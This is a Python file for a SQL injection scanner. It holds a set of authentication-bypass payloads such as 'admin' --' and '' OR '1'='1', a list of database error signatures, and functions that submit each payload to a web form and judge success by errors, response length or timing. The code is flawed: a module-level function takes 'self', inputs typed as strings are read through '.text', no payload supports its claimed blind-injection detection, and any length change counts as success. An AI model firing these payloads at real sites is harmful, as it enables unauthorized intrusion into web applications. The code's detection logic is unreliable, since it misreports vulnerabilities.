import time
from typing import List, Tuple

PAYLOADS = {
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' /*",
    "admin' OR '1'='1",
    "admin' OR '1'='1' --",
    "admin' OR '1'='1' /*",
    "admin' AND '1'='1",
    "admin' AND '1'='1' --",
    "admin' AND '1'='1' /*",
    "admin' AND '1'='2",
    "admin' AND '1'='2' --",
    "admin' AND '1'='2' /*",
    "admin' AND '2'='2",
    "admin' AND '2'='2' --",
    "admin' AND '2'='2' /*",
    "admin' AND '3'='2",
    "admin' AND '3'='2' --",
    "admin' AND '3'='2' /*",
    "admin' AND '4'='2",
    "admin' AND '4'='2' --",
    "admin' AND '4'='2' /*",
    "admin' AND '5'='2",
    "admin' AND '5'='2' --",
    "admin' AND '5'='2' /*",
}

ANSWERS = [
    "You have an error in your SQL syntax;",
    "Warning: mysql_fetch_array() expects parameter 1 to be resource",
    "Warning: mysql_fetch_assoc() expects parameter 1 to be resource",
    "Warning: mysql_num_rows() expects parameter 1 to be resource",
    "Warning: mysql_result() expects parameter 1 to be resource",
    "Warning: pg_exec() [function.pg-exec]: Query failed:",
    "Warning: require() [function.require]: Failed opening required",
    "Warning: include() [function.include]: Failed opening",
    "Microsoft OLE DB Provider for ODBC Drivers error",
    "Microsoft OLE DB Provider for SQL Server error",
    "ODBC Microsoft Access Driver error",
    "ODBC SQL Server Driver error",
    "OLE DB Provider for ODBC",
    "Unclosed quotation mark after the character string",
    "SQL command not properly ended",
    "Query failed to execute",
    "Query failed to execute due to invalid syntax",
    "Error in SQL syntax",
    "Invalid SQL syntax",
    "SQL syntax error",
    "SQL error",
    "Database error",
    "Query error", ]


def test_sql_injection_in_form(self, form: str, url: str) -> List[Tuple[bool, str]]:
    """
    Test a web form for SQL Injection vulnerabilities, including Blind SQL Injection.

    This function submits various payloads that could potentially manipulate SQL queries if the input is not properly sanitized.
    After each submission, it checks the response against a normal response and a list of error messages that might indicate a successful SQL Injection.
    If the response is different from the normal response or contains any of the error messages, or if the response time is significantly longer than usual, the corresponding payload is added to the results.

    Args:
        form (str): The web form to test.
        url (str): The URL to submit the form to.

    Returns:
        List[Tuple[bool, str]]: A list of tuples. Each tuple contains a boolean indicating whether the SQL Injection was successful,
                                 and the payload that was used.
    """

    results = []

    start_time = time.time()
    normal_response = self.submit_form(form=form, value="normal value", url=url)
    normal_time = time.time() - start_time

    for payload in PAYLOADS:
        try:
            start_time = time.time()
            response = self.submit_form(form=form, value=payload, url=url)
            response_time = time.time() - start_time

            if is_sql_injection_successful(response, normal_response, response_time, normal_time):
                results.append((True, payload))

            else:
                results.append((False, payload))

        except Exception:
            results.append((False, payload))

    return [result for result in results if result[0]]


def is_sql_injection_successful(response: str, normal_response: str, response_time: float, normal_time: float) -> bool:
    """
    Check if a SQL Injection was successful, including Blind SQL Injection.

    This function checks a response against a normal response and a list of error messages that might indicate a successful SQL Injection.
    If the response is different from the normal response or contains any of the error messages, or if the response time is significantly longer than the normal response time, the function returns True.

    Args:
        response (str): The response to check.
        normal_response (str): The normal response to compare against.
        response_time (float): The time it took to get the response.
        normal_time (float): The time it took to get the normal response.

    Returns:
        bool: True if the SQL Injection was successful, False otherwise.
    """
    if any(error_message in response.text for error_message in ANSWERS):
        return True

    if len(response.text) != len(normal_response.text):
        return True

    if response_time > normal_time * 2:  # Response time is significantly longer
        return True

    return False
